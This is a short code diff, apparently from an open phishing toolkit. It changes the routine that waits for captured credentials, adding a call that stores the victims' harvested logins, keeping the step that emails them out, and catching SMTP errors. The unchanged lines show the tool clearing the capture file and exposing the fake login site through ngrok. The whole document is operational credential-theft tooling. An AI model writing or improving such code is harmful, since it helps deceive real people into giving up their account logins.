@@ -15,6 +15,8 @@ from time import sleep
 from huepy import *
 from subprocess import getoutput
 from core.email import send_mail
+from core.credentials import credentials
+from smtplib import SMTPSenderRefused, SMTPServerDisconnected
 
 def runPhishing(social, custom):
     global _social
@@ -38,9 +40,15 @@ def waitCreds():
             print(green('\n [*] Credentials found:\n %s' % lines))
             system('rm -rf base/Server/www/cat.txt && touch base/Server/www/cat.txt')
             try:
-                send_mail(lines.split('\n'),_social)       
+                credentials(lines.split('\n'), _social)
+                send_mail(lines.split('\n'),_social)
             except NameError:
-                pass                
+                pass         
+            except SMTPSenderRefused:
+                print(red(' [!] sorry, sender refused :('))
+                pass
+            except SMTPServerDisconnected:
+                pass
 
 def runNgrok():
     system('./base/Server/ngrok http 1449 > /dev/null &')
